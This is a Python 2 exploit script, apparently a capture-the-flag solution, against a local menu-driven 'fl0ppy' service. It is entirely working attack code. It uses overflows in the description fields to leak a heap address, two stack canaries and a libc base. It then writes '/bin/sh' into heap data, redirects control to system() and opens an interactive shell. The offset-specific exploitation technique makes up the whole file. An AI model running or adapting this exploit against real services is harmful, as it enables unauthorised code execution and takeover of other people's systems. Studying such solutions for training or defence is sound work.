from socket import *
import struct
import telnetlib

ip='127.0.0.1'
port=1129

s=socket(AF_INET,SOCK_STREAM)
s.connect((ip,port))

t = telnetlib.Telnet() #telentlib 사용
t.sock = s

heap_leak=''
libc_leak=''

libc_base=''
ret=''

canary1=''
canary2=''

payload=''
payload_addr=''

def p32(x):
        return struct.pack('I',x)

def up32(x):
        return struct.unpack('I',x)[0]

def recv_until(s,c):
        data = ""
        while c not in data:
                data += s.recv(1)
        return data

def Choose_floppy(select):
        s.send("1"+"\n")
        print recv_until(s,'2?')
        s.send(select+'\n')

def Write(data,desc):
        s.send('2'+'\n')
        print s.recv(1024)
        s.send(data+"\n")
        print s.recv(1024)
        s.send(desc+"\n")

def Read():
        s.send('3'+'\n')

def Modify_description(a1,a2):
        s.send('4'+'\n')
        print s.recv(1024)
        s.send(a1+'\n')
        print s.recv(1024)
        s.send(a2+'\n')

def Modify_data(a1,a2):
        s.send('4'+'\n')
        print s.recv(1024)
        s.send(a1+'\n')
        print s.recv(1024)
        s.send(a2)
        raw_input()
def Exit():
        s.send('5'+'\n')

######heap_leak###########
print recv_until(s,'>'+'\n')

Choose_floppy('1')
print recv_until(s,'>'+'\n')

Write('AAAA','B'*10)
print recv_until(s,'>'+'\n')

Choose_floppy('2')
print recv_until(s,'>'+'\n')

Write('CCCC','D'*10)
print recv_until(s,'>'+'\n')

Modify_description('1','a'*20) #fl0ppy2 Modify
print recv_until(s,'>'+'\n')

Read();                        #fl0ppy1 data(malloc) heap leak
print recv_until(s,'DESCRIPTION: ')
s.recv(20)
heap_leak=up32(s.recv(4))
print hex(heap_leak)
#############################

#######canary1_leak#############
print recv_until(s,'>'+'\n')

Choose_floppy('1')
print recv_until(s,'>'+'\n')

Modify_description('1','b'*16)
print recv_until(s,'>'+'\n')

Read();
print recv_until(s,'DESCRIPTION: ')

s.recv(16)
canary1=up32(s.recv(4))
canary1=canary1
print hex(canary1)
##############################

########canary2_leak#########
print recv_until(s,'>'+'\n')

Choose_floppy('1')
print recv_until(s,'>'+'\n')

Modify_description('1','c'*16+p32(canary1))
print recv_until(s,'>'+'\n')

Read();
print recv_until(s,'DESCRIPTION: ')

s.recv(20)
canary2=up32(s.recv(4))
print hex(canary2)
############################

#########libc_leak############
print recv_until(s,'>'+'\n')

Choose_floppy('1')
print recv_until(s,'>'+'\n')

Modify_description('1','b'*16+p32(canary1)+p32(canary2)+'A'*8)
print recv_until(s,'>'+'\n')

Read();
print recv_until(s,'DESCRIPTION: ')

s.recv(32)
libc_leak=up32(s.recv(4))
print hex(libc_leak)

libc_base=libc_leak - 0x19af3

##############################
system_addr=libc_base+0x40310

print recv_until(s,'>'+'\n')

Choose_floppy('1')
print recv_until(s,'>'+'\n')

Modify_data('2','/bin/sh\00') #modify data
print recv_until(s,'>'+'\n')

payload=''
payload+=p32(system_addr)
payload+='A'*4
payload+=p32(heap_leak) #"/bin/sh"

payload_addr=canary1-0x10

Choose_floppy('2')
print recv_until(s,'>'+'\n')

Modify_description('1',payload)

Choose_floppy('1')
print recv_until(s,'>'+'\n')
Modify_description('1','B'*16+p32(canary1)+p32(payload_addr+4))

Exit()
raw_input('exploit')

print s.recv(1024)

print '[*]canary1 address: '+str(hex(canary1))
print '[*]canary2 address: '+str(hex(canary2))
print '[*]heap leak address: '+str(hex(heap_leak))
print '[*]libc leak address: '+str(hex(libc_leak))
print '[*]libc base address: '+str(hex(libc_base))
print '[*]system libc address: '+str(hex(system_addr))

t.interact()

s.close()


